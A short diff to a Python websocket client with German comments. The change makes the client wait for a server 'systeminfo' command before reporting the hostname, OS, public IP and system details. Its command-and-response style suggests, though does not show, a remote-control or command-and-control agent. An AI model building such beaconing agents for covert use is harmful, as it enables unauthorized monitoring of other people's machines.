@@ -647,16 +647,21 @@ async def connect_to_server():
             async with websockets.connect(SERVER_URI) as websocket:
                 logging.info("[+] Verbunden mit dem Server.")
 
-                # Sende Hostname, OS und IP direkt nach Verbindungsaufbau
+                # Warte auf systeminfo-Request vom Server
                 try:
-                    sysinfo = get_system_info()
-                    await websocket.send(json.dumps({
-                        "type": "client_hello",
-                        "hostname": socket.gethostname(),
-                        "os": platform.platform(),
-                        "ip": get_public_ip(),
-                        "output": sysinfo,
-                    }))
+                    msg = await websocket.recv()
+                    if isinstance(msg, bytes):
+                        msg = msg.decode("utf-8", errors="ignore")
+                    data = json.loads(msg)
+                    if data.get("action") == "systeminfo":
+                        sysinfo = get_system_info()
+                        await websocket.send(json.dumps({
+                            "type": "command_output",
+                            "output": sysinfo,
+                            "hostname": socket.gethostname(),
+                            "os": platform.platform(),
+                            "ip": get_public_ip(),
+                        }))
                 except Exception as e:
                     logging.warning(f"Fehler beim Senden von Systeminfos: {e}")
 
